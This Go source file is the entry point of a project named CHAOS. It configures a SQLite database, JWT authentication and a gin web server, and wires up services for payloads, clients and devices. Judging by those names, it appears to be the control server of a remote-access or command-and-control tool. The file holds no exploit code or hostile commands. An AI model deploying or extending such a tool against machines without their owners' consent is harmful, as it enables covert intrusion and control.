package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/jinzhu/gorm"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/database"
	httpDelivery "github.com/tiagorlampert/CHAOS/delivery/http"
	"github.com/tiagorlampert/CHAOS/middleware"
	"github.com/tiagorlampert/CHAOS/repositories/sqlite"
	"github.com/tiagorlampert/CHAOS/services"
	"github.com/tiagorlampert/CHAOS/shared/environment"
	"github.com/tiagorlampert/CHAOS/shared/utils/constants"
	"github.com/tiagorlampert/CHAOS/shared/utils/system"
	"github.com/tiagorlampert/CHAOS/shared/utils/template"
	"github.com/tiagorlampert/CHAOS/shared/utils/ui"
	"net/http"
)

const AppName = "CHAOS"

var Version = "dev"

type App struct {
	logger        *logrus.Logger
	configuration *environment.Configuration
	router        *gin.Engine
}

func init() {
	system.ClearScreen()
}

func main() {
	logger := logrus.New()
	logger.Info(`Loading environment variables`)

	configuration := environment.Load()
	if err := configuration.Validate(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error validating environment config variables`)
	}

	dbClient, err := database.NewSQLiteClient(constants.DatabaseDirectory, configuration.Database.Name)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := NewApp(logger, configuration, dbClient.Conn).Run(); err != nil {
		logger.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbClient *gorm.DB) *App {
	//repositories
	authRepository := sqlite.NewAuthRepository(dbClient)
	userRepository := sqlite.NewUserRepository(dbClient)
	deviceRepository := sqlite.NewDeviceRepository(dbClient)

	//services
	payloadService := services.NewPayload()
	authService := services.NewAuth(authRepository, userRepository)
	userService := services.NewUser(userRepository)
	deviceService := services.NewDevice(deviceRepository)
	clientService := services.NewClient(Version, authRepository, payloadService, authService)
	urlService := services.NewURLService(clientService)

	//router
	router := gin.Default()
	router.Use(gin.Recovery())
	router.Static("/static", "web/static")
	router.HTMLRender = template.LoadTemplates("web")

	auth, err := authService.Setup()
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error preparing authentication`)
	}
	jwtMiddleware, err := middleware.NewJWTMiddleware(auth.SecretKey, userService)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating jwt middleware`)
	}

	httpDelivery.NewController(
		configuration,
		router,
		logger,
		jwtMiddleware,
		clientService,
		authService,
		payloadService,
		userService,
		deviceService,
		urlService,
	)

	ui.ShowMenu(configuration.Server.Port)

	return &App{
		configuration: configuration,
		logger:        logger,
		router:        router,
	}
}

func (a *App) Setup() error {
	return system.CreateDirs(
		constants.TempDirectory, constants.DatabaseDirectory)
}

func (a *App) Run() error {
	if err := a.Setup(); err != nil {
		a.logger.Error(err)
	}

	a.logger.WithFields(
		logrus.Fields{`version`: Version, `port`: a.configuration.Server.Port}).Info(`Starting `, AppName)

	return http.ListenAndServe(
		fmt.Sprintf(":%s", a.configuration.Server.Port),
		http.TimeoutHandler(a.router, constants.TimeoutDuration, constants.TimeoutExceeded))
}
